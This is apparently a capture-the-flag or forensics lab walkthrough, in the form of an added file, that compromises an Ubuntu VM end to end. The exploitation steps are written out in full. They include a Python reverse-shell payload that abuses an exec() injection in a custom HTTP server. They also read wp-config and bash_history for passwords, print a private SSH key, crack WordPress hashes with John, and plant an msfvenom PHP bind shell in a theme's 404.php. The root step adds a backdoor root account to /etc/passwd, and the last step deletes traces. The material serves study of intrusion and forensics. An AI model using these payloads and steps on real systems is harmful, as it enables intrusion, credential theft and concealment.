@@ -1,0 +1,660 @@
+
+
+// Lab Preparation 
+// Host Machine - Win10 (HM) , Attacking VM - Kali Linux x64 (AVM), Target VM - Ubuntu 16.04 x64 ( TVM )
+// Tools :  Wireshark , LiME ,  Screen Video Capture . Netcat , Python Http, openssl, Metasploit, Msfvenom , Namp , DIRB, WFUZZ, wpscan, John-ripper
+
+// Launch TVM 
+
+// Fire up your AVM 
+
+// Take a snapshot either on TVM and AVM !
+
+// Strat Capture the network packet between TVM ethernet and AVM ethernet
+ 
+// Scan the network for obtain the potential target 
+
+root@kali:/bk# nmap -sP -PI -PY 192.168.1.0/24
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-14 06:21 EDT
+Nmap scan report for ultrahub.hub (192.168.1.1)
+Host is up (0.0047s latency).
+MAC Address: A4:91:B1:CC:25:D6 (Technicolor)
+Nmap scan report for HM-THINKPAD.hub (192.168.1.38)
+Host is up (0.055s latency).
+MAC Address: E4:BE:18:84:44:0E (Intel Corporate)
+Nmap scan report for 192.168.1.110
+Host is up (0.40s latency).
+MAC Address: E4:B3:19:B4:A4:0E (Intel Corporate)
+
+// Located the target on 192.168.1.110
+// Deep scan with target by using Nmap
+
+root@kali:/bk# nmap -A -T4 -p- 192.168.1.110
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-14 06:23 EDT
+Nmap scan report for 192.168.1.110
+Host is up (0.0051s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: SouthPark
+8080/tcp open  http-proxy MyHTTPServer
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 14 Apr 2020 22:30:36
+|     Server: MyHTTPServer
+|     Last-Modified: Tue, 14 Apr 2020 22:30:36
+|     Content-Length: 1184
+|     Content-Type: text/html
+|     Connection: Closed
+|     <!DOCTYPE html>
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+|     <meta charset="utf-8">
+|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <title>Lab-Page</title>
+|     <link href="http://static.zhyd.me/static/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
+|     <link href="http://cdn.bootcss.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet">
+|     </head>
+|     <body>
+|     <div class="container">
+|     <div class="row">
+|     <div class="col col-md-12 text-center">
+|     <div class="alert alert-success alert-dismissable" style="margin-top: 20px">
+|_    <button type="button" c
+|_http-server-header: MyHTTPServer
+|_http-title: Lab-Page
+9422/tcp open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a5:58:9e:5a:cc:f7:eb:24:15:e6:86:0b:69:6c:c9:06 (RSA)
+|   256 22:9f:17:81:d9:bf:74:4d:4b:be:39:dd:3b:c4:a8:2e (ECDSA)
+|_  256 ad:9c:5a:49:8d:10:8f:9f:24:16:78:ae:98:ab:e9:9a (ED25519)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.80%I=7%D=4/14%Time=5E958F3B%P=i686-pc-linux-gnu%r(GetR
+SF:equest,550,"HTTP/1\.1\x20200\x20OK\nDate:\x20Tue,\x2014\x20Apr\x202020\
+MAC Address: E4:B3:18:84:A4:0E (Intel Corporate)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   5.14 ms 192.168.1.110
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
+
+// Analyze the results and find next targets on port 80 and 8080
+// Open the web browser to connect this 2 sites
+// Check the website carefully and do not missing any of the hints
+// http://192.168.1.110/ is the Team South Park site and http://192.168.1.110:8080 is a site which under construction, but it indicates with Python
+// In the Mean time, using DIRB and WFUZZ to scan the web directory. 
+
+root@kali:/bk# dirb http://192.168.1.110 
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+START_TIME: Tue Apr 14 06:29:19 2020
+URL_BASE: http://192.168.1.110/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+-----------------
+GENERATED WORDS: 4612                                                          
+---- Scanning URL: http://192.168.1.110/ ----
+==> DIRECTORY: http://192.168.1.110/assets/                                                                                                 
+==> DIRECTORY: http://192.168.1.110/css/                                                                                                    
++ http://192.168.1.110/index.html (CODE:200|SIZE:11754)                                                                                     
+==> DIRECTORY: http://192.168.1.110/js/                                                                                                     
++ http://192.168.1.110/server-status (CODE:403|SIZE:278)                                                                                    
+==> DIRECTORY: http://192.168.1.110/wordpress/                                                                                              
+                                                                                                                                            
+---- Entering directory: http://192.168.1.110/assets/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                            
+---- Entering directory: http://192.168.1.110/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                            
+---- Entering directory: http://192.168.1.110/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                            
+---- Entering directory: http://192.168.1.110/wordpress/ ----
++ http://192.168.1.110/wordpress/index.php (CODE:301|SIZE:0)                                                                                
+==> DIRECTORY: http://192.168.1.110/wordpress/source/  
+
+
+root@kali:/bk# wfuzz -c -z file,common.txt -u http://192.168.1.110/FUZZ | grep -v "404"
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.1.110/FUZZ
+Total requests: 949
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                     
+===================================================================
+
+000000076:   301        9 L      28 W     315 Ch      "assets"                                                                    
+000000223:   301        9 L      28 W     312 Ch      "css"                                                                       
+000000454:   301        9 L      28 W     311 Ch      "js"                                                                        
+
+Total time: 1.911683
+Processed Requests: 949
+Filtered Requests: 0
+Requests/sec.: 496.4211
+
+root@kali:/bk# dirb http://192.168.1.110:8080 
+root@kali:/bk# wfuzz -c -z file,big.txt -u http://192.168.1.110:8080/FUZZ | grep -v "404"
+
+// All the results shows extra directory is existed under the site, dig more for any findings under /wordpress ?
+
+// Yes, there is a Wordpress site here http://192.168.1.110/wordpress/
+// Still, check all the information under this Wordpress site, and found the interesting part is under the comments window.
+
+Hi, irini
+I have copied the HTTPD source “code” file under this WP server, please review it.
+Thanks
+
+// The Above comment shows the hint for username and source code that Alex has putted it under the Wordpress server
+// Thinking about how to do on next , but can do the wpscan in advance.
+
+root@kali:/bk# wpscan --url http://192.168.1.110/wordpress
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.7.11
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.1.110/wordpress/ [192.168.1.110]
+[+] Started: Tue Apr 14 06:44:30 2020
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.1.110/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+// Found exploit for brute force login access, but please, do not always try to using the force !
+
+// Brain storm time, thinking about the why Alex left message to irini for telling the code and Wordpress?
+// Is that possible the code was written by python and store it under Wordpress directory?
+// Action it and try to scan the FUZZ folder under Wordpress
+
+root@kali:/bk# wfuzz -c -z file,common.txt -u http://192.168.1.110/wordpress/FUZZ/code.py | grep -v "404"
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.1.110/wordpress/FUZZ/code.py
+Total requests: 949
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                     
+===================================================================
+
+000000771:   200        171 L    498 W    5889 Ch     "source"                                                                    
+
+Total time: 1.776616
+Processed Requests: 949
+Filtered Requests: 0
+Requests/sec.: 534.1614
+
+// Bingo! Now, we can download the source code by this link !
+http://192.168.1.110/wordpress/source/code.py
+
+root@kali:/bk# wget http://192.168.1.110/wordpress/source/code.py
+--2020-04-14 07:20:10--  http://192.168.1.110/wordpress/source/code.py
+Connecting to 192.168.1.110:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5889 (5.8K) [text/x-python]
+Saving to: ‘code.py’
+
+code.py                             100%[================================================================>]   5.75K  --.-KB/s    in 0s      
+
+2020-04-14 07:20:10 (217 MB/s) - ‘code.py’ saved [5889/5889]
+
+// By review this code
+
+// General meaning of this code is for putting the socket in the startu of listening, when it is receiving the http request,  Call Request's parseRequest by using split method, then call handleRequest to process the requests, handle the request files by serveDoc.
+// Found the nudge by search the function
+
+def serveDoc(self, path, docRoot):
+    path = urllib.parse.unquote(path)
+    try:
+        info = "output = 'Document: {}'" # Keep the output for later debug
+        exec(info.format(path)) # This is how you do string formatting, right?
+        cwd = os.path.dirname(os.path.realpath(__file__))
+        docRoot = os.path.join(cwd, docRoot)
+
+//The path here is a stain parameter, and there is command injection for the exec function
+
+path = "\';os.system('whoami')#"
+
+// Take this vulnerability of this code for writing the reverse shell by Python
+
+import requests                                                                                                                       
+import urllib                                                                                                                         
+import os                                                                                                                             
+                                                                                                                                      
+url = 'http://192.168.1.110:8080/'                                                                                                    
+
+path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.232",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''
+
+payload = urllib.parse.quote(path)
+print("payload")
+print(url+payload)
+
+r= requests.get(url+payload)
+print(r.headers)
+print(r.text)
+
+// Copy and save this Python reverse shell in to the Attacking VM. Fire it right away!
+
+# nc -lvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+
+# python3 reveseshell.py 
+payload
+http://192.168.1.110:8080/5%27%0Aimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.231%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22/bin/bash%22%2C%22-i%22%5D%29%0Aa%3D%27
+
+# nc -lvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from [192.168.1.110] port 4444 [tcp/*] accepted (family 2, sport 55608)
+bash: cannot set terminal process group (802): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@shadow:~$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+// Got a shell under username “ www-data”
+
+// Enumerate Linux  by thinking about this is an Apache server running the Wordpress, might be a LAMP( Linux Apache MySql PHP) ?
+// Checking the apache config file , checking the default /var/www/html/, seeking the PHP vulnerability and Mysql vulnerability.
+
+// please note that u need to always cd to /tmp folder for all the operations that easy to clean up the trace later
+// Browser all the directories and files in order to get more clear overview.
+
+www-data@shadow:/tmp$ cat /etc/passwd
+// noticed another 2 users : Alex , irini
+
+www-data@shadow:/tmp$ cat /var/www/html/wordpress/wp-config.php
+
+/** MySQL database password */
+define('DB_PASSWORD', 's0uthp4rk');
+
+// found a password “ s0uthp4rk “ under username “root”!
+
+// check .bash_history under irini
+
+www-data@shadow:/tmp$ cat /home/irini/.bash_history
+
+tar -zcvf - id_rsa | openssl des3 -salt -k p4ss0rd | dd of=id_rsa.des3
+
+// found a password by tar the possible private key 
+
+www-data@shadow:/tmp$ find /home -name id_rsa.des3
+/home/irini/Desktop/id_rsa.des3
+
+// Detected this file under irini’s Desktop
+// cp and decrypted this file , then use that key to access irini’s shell
+
+www-data@shadow:/tmp$ cp /home/irini/Desktop/id_rsa.des3 .
+cp /home/irini/Desktop/id_rsa.des3 .
+www-data@shadow:/tmp$ ls
+ls
+id_rsa.des3
+LinEnum.sh
+systemd-private-90e57448edae4050b96744813d4aba85-systemd-timesyncd.service-FZu4E5
+VMwareDnD
+vmware-root
+
+www-data@shadow:/tmp$ dd if=id_rsa.des3 | openssl des3 -d -k p4ss0rd | tar zxvf -
+<=id_rsa.des3 | openssl des3 -d -k p4ss0rd | tar zxvf -                      
+2+1 records in
+2+1 records out
+id_rsa
+1520 bytes (1.5 kB, 1.5 KiB) copied, 0.000291754 s, 5.2 MB/s
+
+www-data@shadow:/tmp$ ls
+ls
+id_rsa
+id_rsa.des3
+LinEnum.sh
+systemd-private-90e57448edae4050b96744813d4aba85-systemd-timesyncd.service-FZu4E5
+VMwareDnD
+vmware-root
+
+www-data@shadow:/tmp$ cat id_rsa
+cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7A2BC578D8AEE5051A263FBD381BA794
+
+YFmOqyz/dA80F6hMBJr9xPzacAsniwOnUOiGJhFDYqH7H7y3jHFw1MYIikEf+LDS
+RrlpiIzIJe9zu/EpvgbWr2LN3MOglRZodWxXoBEoIkUT+X5eilkuP5zn3Yjtzk5b
+LmvZRNkkWQvTiaVEJf7XhGbw3SzRoTQlzim1ZzaUMmZKbbA5/kaXRhsithxPgiIW
+51OiiAp9oAudxXpuLUaoCV9PlvFFMrRj2dQXRhVokTRwlHRFanT/3ch4h9z8rKtp
+X+05pFsBUSkc1FiBZX6JpoBL4Aq42WSbVQsTqzD1CNNaYObLdPNr1H6hOKmvdJQV
+qOCpyJELntBSdxE/InKAfM63nFEr03E2R1h/qVo9M6ES1l0xg8Xa5HaMQiJWrnh3
+GgU/BRLnWljpAwtcWitJVjomSrkXUDy6WcLEejGwhPJSjqVUydzIR58qLhaLurfa
+BvBvMRZPdU6S4LdXoXGDHYhxdCtgLzk4KYCnwyyvxRNTK+lHeKW7yD9uRQzSkYmp
+q9zXM5ri5rwQWIf9YoXl2ytyXD82KXcN37R7Z40F5cG1sp7IUu5z2XsBv66I0cgC
+jgQmr7Ksg7/ipEWsRQLoeHXetBYmx+AJAau+276g6LLo5mD8zR+Jpb+QCwFsMq43
+X1gax07UibfYIgBIqdSP12wK/YAsu7knLYeANdP9Qhj4B+RZNCj+neV7+FIWfL4j
+xqrslkTeKLnTswpHNSWuaiQr9+D51wjOuZSl9LsDg9JgtDdjLB6Mu9UACh9iwWId
+2izLJWmCxFkAwKQ2E5U1Ya2MggpqnwXrV9cv9Gumy2NGLfP7RjNhILLmnV2v75G3
+XSvT1dPshBG+XENpBPRCr1ZkuP9GbDJLY8AfgTAgCPDOUUPABY/u4NX6XEcNXJeK
+ENUmhub7QKdRj3MpkxvSF4K94W2HLqxq99++imP/VmgwfIQHavekrImTjJ+EihAj
+/wzcZn8/dZJyy8nhgKgv7YTGO3Yuz01bLlJQOHGy6NrkOJsdVZKGx49VxCXDYgJ8
+Jfh4CqLWva13tpSb7Ax9f2bzyHB5scFjIyHphvUw+IYo0o2sixrCROqRaZOVHB7c
+CeHpj4wS5Uvmo07klqh8xUJYL4pFJd5EfscP3QFBb5GmTcLiPTirY/h6mpSatbMZ
+p/z4b0UrBlNb+TISQk58Gwy5z3QZXldD5xJIblrImC6loIyxLqrgpCJi2bkiqdXv
+NTlDLm9PC82pZ4x2xpr0joYhfUnDFQc0447x3GMcNk5/W5n3zQE49QfRLrovsUZm
+atgtTSpFOIyqdY58IqSTcwaz7ZN9lOAtyRhA+M1bLuDnsp3NI6W/1TfGnIW1S9uv
+ZWI6+nGwSmxFrUEmfPGWTUY2ntBLpsT318bni0fxh03xZAZPmvMxWbzo7xy44zcJ
+4OCgPbKlOdY2evXsifYTjJTKCSyvn0ZkYr0wnAc731flFgxZDrD7+oHetMjoSQTp
+MugLYq6yOgIkhmomMcWzq3Dk2XXkES5XA6Uft00dWOxqiExjp4IWm3xxvvUov5F9
+ku5dTWqkgiQsQKzsbVVB2eF/eatnZsG2g0fKKJpNfjl5pdmH85oThEeR9hLRSeBa
+-----END RSA PRIVATE KEY-----
+
+// Note, the ssh port is 9422, you have to scan the big ports in order to see all the information !
+
+# ssh -p 9422 -i irini.key irini@192.168.1.110
+Enter passphrase for key 'irini.key':        //  remember this password? Yes! It is “s0uthp4rk”
+Digital Corpara Project for Seeing Behind the Sh@d0vv 
+
+All Rights Reseved by <Team South Park> in Year of Covid-19.
+
+irini@shadow:/tmp$ id
+uid=1000(irini) gid=1000(irini) groups=1000(irini),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
+// In the real-world, you might be try to access Alex or with multi password attempts… Fun! Isn’t it? ^_^
+
+// Privilege Escalation 
+
+//Download LinEnum.sh from the Github. 
+root@kali:~# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+// Holding a simple http server in Kali 
+
+root@kali:~# python -m SimpleHTTPServer 80
+
+// download the shell to the target VM
+
+irini@shadow:/tmp$ wget http://192.168.1.232/LinEnum.sh
+
+// after run the shell, found some interesting things that can lead us to the next stage.
+
+// apache service running by user: Alex
+
+alex       6116  0.0  4.1 264108 19656 ?        S    15:15   0:00 /usr/sbin/apache2 -k start
+alex       6117  0.0  2.7 266068 13008 ?        S    15:15   0:00 /usr/sbin/apache2 -k start
+alex       6118  0.0  2.7 263632 12980 ?        S    15:15   0:00 /usr/sbin/apache2 -k start
+alex       6119  0.0  2.4 263632 11736 ?        S    15:15   0:00 /usr/sbin/apache2 -k start
+alex       6120  0.0  3.6 263640 17372 ?        S    15:15   0:00 /usr/sbin/apache2 -k start
+alex       6141  0.0  0.9 263264  4636 ?        S    15:15   0:00 /usr/sbin/apache2 -k start
+alex       6142  0.0  3.6 263632 17316 ?        S    15:15   0:00 /usr/sbin/apache2 -k start
+
+// Alex has /bin/cp sudo rights, assume that he is the web admin in the server. 
+
+[-] Sudoers configuration (condensed):Defaults	env_reset
+Defaults	mail_badpass
+Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+root	ALL=(ALL:ALL) ALL
+%admin ALL=(ALL) ALL
+alex ALL=(ALL) NOPASSWD: /bin/cp
+%sudo	ALL=(ALL:ALL) ALL
+
+// Okay, let’s try to penetration apache and Wordpress , remember the mysql config file in wp-config.pph
+// Indicated the username as root and password is s0uthp4rk, let’s have an attempt!
+
+irini@shadow:/tmp$ mysql -u root -p 
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 168
+Server version: 5.7.29-0ubuntu0.16.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| wordpress          |
++--------------------+
+5 rows in set (0.35 sec)
+
+mysql> use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows in set (0.00 sec)
+
+mysql> select * from wp_users;
++----+------------+------------------------------------+---------------+-------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email              | user_url | user_registered     | user_activation_key                           | user_status | display_name |
++----+------------+------------------------------------+---------------+-------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
+|  1 | admin      | $P$Bg/ZLfi2Yp/GNlIJYHqZNdIHmbOBA21 | admin         | southpark@southpark.lab |          | 2020-04-04 07:26:21 |                                               |           0 | admin        |
+|  2 | irini      | $P$BbamzO1udwO3RPNNa5TfKdmg2iPrw30 | irini         | irini@southpark.lab     |          | 2020-04-15 02:46:01 | 1586918761:$P$BpfczEWEBm0aAQ0V1iXaSXYWahTO8H. |           0 | irini        |
+|  3 | alex       | $P$BjVdax8xQrAKeTX0tPeEFLRgAm81KM/ | alex          | alex@southpark.lab      |          | 2020-04-15 02:46:57 | 1586918817:$P$Bwd5t46hbHcEjQ0BCmb2uSEC0hQYsP. |           0 | alex         |
++----+------------+------------------------------------+---------------+-------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
+3 rows in set (0.13 sec)
+
+// Lucky! Now you have all the users’s hash data and fire up to the John-ripper
+// Basically, you need to crack all the password and try to access the page, but here just show how to crack ALEX
+
+root@kali:/bk# echo '$P$BjVdax8xQrAKeTX0tPeEFLRgAm81KM/' > alex.hash
+
+root@kali:/bk# john --wordlist=/usr/share/wordlists/rockyou.txt alex.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alexpassword     (?)
+1g 0:00:10:23 DONE (2020-04-15 00:25) 0.001603g/s 16420p/s 16420c/s 16420C/s alexrae10..alexpammy1
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed
+
+// Password is “ alexpassword “ , login the Wordpress admin site : http://192.168.1.110/wordpress/wp-login.php
+// Verified Alex has the admin rights in the admin panel.
+// Go to - appearance - editor - < you will find the source code is editable ! > 
+// Choose the 404.php as the payload page that because of limited use of this page.
+
+// Find where is this page in the existing irini’s shell
+
+# Find /var/www/html/wordpress/ -name "404.php"
+/var/www/html/wordpress/wp-content/themes/twentysixteen/404.php
+/var/www/html/wordpress/wp-content/themes/twentyfifteen/404.php
+/var/www/html/wordpress/wp-content/themes/twentyfourteen/404.php
+
+// Located the http position :  http://192.168.1.110/wordpress/wp-content/themes/twentysixteen/404.php
+
+// Generate a php payload with the bind shell 
+
+root@kali:/bk# msfvenom -p php/meterpreter/bind_tcp lport=5555 -f raw 
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1338 bytes
+/*<?php /**/ error_reporting(0); $ip = '0.0.0.0'; $port = 5555; if (is_callable('stream_socket_server')) { $srvsock = stream_socket_server("tcp://{$ip}:{$port}"); if (!$srvsock) { die(); } $s = stream_socket_accept($srvsock, -1); fclose($srvsock); $s_type = 'stream'; } elseif (is_callable('socket_create_listen')) { $srvsock = socket_create_listen(AF_INET, SOCK_STREAM, SOL_TCP); if (!$res) { die(); } $s = socket_accept($srvsock); socket_close($srvsock); $s_type = 'socket'; } elseif (is_callable('socket_create')) { $srvsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); $res = socket_bind($srvsock, $ip, $port); if (!$res) { die(); } $s = socket_accept($srvsock); socket_close($srvsock); $s_type = 'socket'; } else { die(); } if (!$s) { die(); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+
+// copy the payload and replace the contents into the 404.php , and update the file till you see the “File edited successfully.”
+
+// Setup a listener on the Attacking Kali and run the exploit 
+
+msf5 exploit(multi/handler) > options 
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+Payload options (php/meterpreter/bind_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  5555             yes       The listen port
+   RHOST  192.168.1.110    no        The target address
+
+msf5 exploit(multi/handler) > run
+
+[*] Started bind TCP handler against 192.168.1.110:5555
+
+// Back to your web browser and refresh payload page !
+http://192.168.1.110/wordpress/wp-content/themes/twentysixteen/404.php
+
+// From the Metasploit , the session opened ! 
+
+msf5 exploit(multi/handler) > run
+
+[*] Started bind TCP handler against 192.168.1.110:5555
+[*] Sending stage (38288 bytes) to 192.168.1.110
+[*] Meterpreter session 5 opened (192.168.1.165:42529 -> 192.168.1.110:5555) at 2020-04-15 00:45:26 -0400
+
+meterpreter > shell
+Process 7416 created.
+Channel 0 created.
+id
+uid=1001(alex) gid=1001(alex) groups=1001(alex)
+/bin/sh -i
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+alex
+
+// ROOT IT under Alex’s shell
+
+$ sudo cp passwd /var/www/html
+
+// copy the whole contents from the site into your AVM : http://192.168.1.110/passwd 
+
+// use openssl to create an user and encrypted pass
+
+root@kali:/bk# openssl passwd -1 -salt ryan ryanpassword 
+$1$ryan$tRB9F.fEoLNkydWoLyVqs1
+
+// Insert this evil into the passwd file
+
+root@kali:/bk# vim passwd 
+
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+ryan:$1$ryan$tRB9F.fEoLNkydWoLyVqs1:0:0:root:/root:/bin/bash
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+irini:x:1000:1000:ubuntu164,,,:/home/irini:/bin/bash
+sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:122:129:MySQL Server,,,:/nonexistent:/bin/false
+alex:x:1001:1001::/home/alex:
+
+// Holding a http server to transfer the passwd into TVM
+
+root@kali:/bk# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+
+// Replace the evil passwd file into the TVM
+
+$ wget http://192.168.1.165/passwd
+--2020-04-15 17:11:09--  http://192.168.1.165/passwd
+Connecting to 192.168.1.165:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2441 (2.4K) [application/octet-stream]
+Saving to: 'passwd'
+
+     0K ..                                                    100% 3.64M=0.001s
+
+2020-04-15 17:11:09 (3.64 MB/s) - 'passwd' saved [2441/2441]
+
+$ sudo cp passwd /etc/passwd
+
+// From irini’s shell, “su - ryan” to escalating the privilege to the ROOT!
+
+irini@shadow:/tmp$ su - ryan
+Password:             // the password you faked with openssl 
+
+root@shadow:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@shadow:~# whoami
+root
+
+// Clean the trace that u leaved before !
+root@shadow:~# rm /tmp/* -rf
+root@shadow:~# rm /var/www/html/
+root@shadow:~# rm /var/www/html/passwd 
+root@shadow:~# rm /var/www/html/shadow 
+
+// From this part ! The attacking has been done ! ! !
+
+// Stop the network packet capture  ^_^
+
+// Start LiME dump generate on the TVM 
